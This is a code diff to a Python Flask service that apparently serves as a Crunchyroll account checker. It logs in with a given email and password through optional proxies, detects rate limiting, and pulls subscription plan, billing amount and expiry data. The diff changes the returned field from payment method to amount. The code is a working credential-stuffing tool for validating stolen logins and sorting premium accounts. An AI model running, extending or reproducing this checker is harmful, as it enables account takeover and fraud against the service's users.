@@ -59,9 +59,9 @@ def crunchyroll_check(email, password, proxy=None):
     proxies = format_proxy(proxy) if proxy else None
 
     plan = "Free"
+    amount = "N/A"
     expiry = "N/A"
     message = "Invalid or Free Account"
-    payment_method = "N/A"
     subscription_status = "Free"
     free_trial = "No"
 
@@ -90,18 +90,18 @@ def crunchyroll_check(email, password, proxy=None):
             headers=auth_request_headers, data=data, proxies=proxies, timeout=15
         )
         if res.status_code in [403, 429, 500, 502, 503]:
-            return email, password, "Blocked/RateLimited by Crunchyroll/Proxy.", plan, expiry, payment_method
+            return email, password, "Blocked/RateLimited by Crunchyroll/Proxy.", plan, amount, expiry
         if "invalid_credentials" in res.text:
-            return email, password, "Invalid or Free Account.", plan, expiry, payment_method
+            return email, password, "Invalid or Free Account.", plan, amount, expiry
 
         try:
             json_res = res.json()
         except Exception:
-            return email, password, "Crunchyroll sent invalid JSON at login.", plan, expiry, payment_method
+            return email, password, "Crunchyroll sent invalid JSON at login.", plan, amount, expiry
 
         token = json_res.get("access_token")
         if not token or json_res.get("error") or json_res.get("unsupported_grant_type"):
-            return email, password, "Invalid or Free Account.", plan, expiry, payment_method
+            return email, password, "Invalid or Free Account.", plan, amount, expiry
 
         auth_headers_subsequent = {
             **common_headers,
@@ -146,7 +146,7 @@ def crunchyroll_check(email, password, proxy=None):
                 else:
                     subscription_status = "Free"
 
-        # Subscriptions v3 (plan, payment_method, etc.)
+        # Subscriptions v3 (plan, amount, etc.)
         if user_id != "N/A":
             sub_v3_res = session.get(
                 f"https://beta-api.crunchyroll.com/subs/v3/subscriptions/{user_id}",
@@ -159,12 +159,12 @@ def crunchyroll_check(email, password, proxy=None):
                 if subscription_products:
                     product = subscription_products[0]
                     sku = product.get("sku") or product.get("subscription_sku") or product.get("plan_id", "N/A")
-                    payment_method = product.get("payment_method_brand", "N/A")
+                    amount = str(product.get("amount", "N/A"))
                 else:
                     sku = sub_v3_json.get("sku") or sub_v3_json.get("subscription_sku") or sub_v3_json.get("plan_id", "N/A")
+                    amount = str(sub_v3_json.get("amount", "N/A"))
                 cycle_duration = sub_v3_json.get("cycle_duration", "N/A")
-                paid_amount = str(sub_v3_json.get("amount", "N/A"))
-                plan = translate_sku_to_plan(sku, paid_amount, cycle_duration)
+                plan = translate_sku_to_plan(sku, amount, cycle_duration)
 
         # Subscriptions v1 (expiry)
         if external_id != "N/A":
@@ -190,9 +190,9 @@ def crunchyroll_check(email, password, proxy=None):
         else:
             message = "Invalid or Free Account"
 
-        return email, password, message, plan, expiry, payment_method
+        return email, password, message, plan, amount, expiry
     except Exception as ex:
-        return email, password, f"Unknown Error: {ex}", plan, expiry, payment_method
+        return email, password, f"Unknown Error: {ex}", plan, amount, expiry
 
 @app.route("/check", methods=["GET", "POST"])
 def check():
@@ -205,14 +205,14 @@ def check():
     if not email or not password:
         return jsonify({"status": "error", "message": "Missing email or password"}), 400
 
-    email, password, message, plan, expiry, payment_method = crunchyroll_check(email, password, proxy if proxy else None)
+    email, password, message, plan, amount, expiry = crunchyroll_check(email, password, proxy if proxy else None)
     return jsonify({
         "email": email,
         "pass": password,
         "message": message,
         "plan": plan,
-        "expiry": expiry,
-        "payment_method": payment_method
+        "amount": amount,
+        "expiry": expiry
     })
 
 @app.route("/")
@@ -221,4 +221,4 @@ def home():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
-            
+    
